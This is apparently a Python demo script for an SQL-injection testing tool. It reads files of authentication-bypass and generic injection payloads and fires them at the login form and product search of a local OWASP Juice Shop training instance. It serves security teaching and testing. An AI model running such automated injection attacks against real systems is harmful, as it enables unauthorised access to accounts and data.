from typing import NamedTuple
from pathlib import Path

from owasp_sql_injections.base import SQLInjectionSession, Target


CURRENT_FOLDER = Path(__file__).parent


class InjectionPayload(NamedTuple):
    auth_bypass_injections = CURRENT_FOLDER / "payloads" / "auth_bypass_injections.txt"
    generic_error_based_payloads = CURRENT_FOLDER / "payloads" / "generic_error_based_payloads.txt"
    generic_sql_injections = CURRENT_FOLDER / "payloads" / "generic_sql_injections.txt"


if __name__ == "__main__":
    """
    Demo running OWASP Juice Shop
    
    https://pwning.owasp-juice.shop/
    """

    with open(InjectionPayload.auth_bypass_injections, "r") as file:
        auth_injection_payload = [x.replace("\n", "") for x in file.readlines()]

    with open(InjectionPayload.generic_sql_injections, "r") as file:
        generic_sql_injections_payload = [x.replace("\n", "") for x in file.readlines()]

    login_form_target = Target(url="http://localhost:3000/rest/user/login")
    scanning_target = Target(url="http://localhost:3000/rest/products/search?q=")
    session = SQLInjectionSession()

    for injection in auth_injection_payload:
        payload = {
            "email": f"{injection}",
            "password": "sdasad"
        }
        session.run_form_injector(payload=payload, target=login_form_target)

    session.run_scanner(target=scanning_target, payload=generic_sql_injections_payload)
